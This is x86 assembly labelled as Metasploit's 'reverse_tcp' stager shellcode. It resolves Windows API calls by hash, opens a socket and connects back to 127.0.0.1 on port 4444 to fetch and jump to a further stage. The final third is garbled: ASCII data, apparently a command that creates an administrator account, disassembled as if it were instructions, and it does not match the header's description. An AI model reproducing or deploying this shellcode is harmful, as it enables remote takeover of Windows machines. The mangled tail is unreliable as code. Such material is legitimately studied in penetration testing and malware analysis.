;
; Metasploit Framework
; http://www.metasploit.com
;
; Source for reverse_tcp (stager)
;
; Authors: hdm <hdm@metasploit.com>, vlad902 <vlad902@gmail.com>
; Size   : 263
;

cld
push byte -0x15
inc edi
call 0x2
pusha
xor ebx,ebx
mov edi,[ebp+0x3c]
mov edi,[ebp+edi+0x78]
add edi,ebp
mov edx,[edi+0x20]
add edx,ebp
mov esi,[edx+ebx*4]
add esi,ebp
xor eax,eax
cdq
lodsb
ror edx,0xd
add edx,eax
test al,al
jnz 0x22
inc ebx
cmp dx,cx
jnz 0x15
dec ebx
mov ecx,[edi+0x24]
add ecx,ebp
mov bx,[ecx+ebx*2]
mov ecx,[edi+0x1c]
add ecx,ebp
add ebp,[ecx+ebx*4]
mov [esp+0x1c],ebp
popa
jmp eax
xor ebx,ebx
mov eax,[fs:ebx+0x30]
mov eax,[eax+0xc]
mov esi,[eax+0x1c]
lodsd
mov ebp,[eax+0x8]
pop esi
push bx
push word 0x3233
push dword 0x5f327377
push esp
mov cx,0x6072
call esi
xchg eax,ebp
push ebx
push ebx
push ebx
push ebx
inc ebx
push ebx
inc ebx
push ebx
mov edi,esp
sub di,0x208
push edi
push ebx
mov cx,0xdfe7
call esi
mov cx,0x6fa8
call esi
xchg eax,edi
push dword 0x100007f
push word 0x5c11
push bx
mov ebx,esp
push byte +0x10
push ebx
push edi
mov cx,0x557
call esi
push eax
mov ah,0xc
push eax
push ebx
push edi
push ebx
mov cx,0x38c0
jmp esi
arpl [ebp+0x64],bp
gs js 0x11d
and [edi],ch
arpl [eax],sp
outsb
gs jz 0xe0
jnz 0x135
gs jc 0xe5
insd
gs jz 0x12a
jnc 0x13b
insb
outsd
imul esi,[eax+0x20],dword 0x4444412f
and [esi],ah
and [es:esi+0x65],ch
jz 0xfd
insb
outsd
arpl [ecx+0x6c],sp
a16 jc 0x154
jnz 0x157
and [ecx+0x64],al
insd
imul ebp,[esi+0x69],dword 0x61727473
jz 0x163
jc 0x169
and [ebp+0x65],ch
jz 0x15c
jnc 0x16d
insb
outsd
imul esi,[eax+0x2f],dword 0x444441
